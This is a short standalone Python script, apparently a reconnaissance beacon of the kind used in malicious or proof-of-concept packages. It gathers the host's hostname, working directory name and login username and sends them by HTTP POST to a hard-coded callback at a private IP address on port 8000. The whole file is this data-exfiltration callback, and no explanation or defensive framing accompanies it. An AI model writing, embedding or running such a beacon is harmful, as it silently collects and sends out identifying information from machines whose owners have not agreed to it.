import os
import subprocess
import json
import requests  # Using requests library for synchronous HTTP requests

# Get hostname
hostname = subprocess.check_output(['hostname']).decode().strip()

# Get directory name
dirname = os.path.basename(os.getcwd())

# Get username
username = os.getlogin()

# Prepare data payload
data = {
    "hostname": hostname,
    "directory": dirname,
    "username": username
}

# Define callback URL
callback_url = "http://192.168.139.156:8000/callback"

# Send data using HTTP POST request
def send_data():
    try:
        response = requests.post(callback_url, json=data)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

# Call the send_data function
send_data()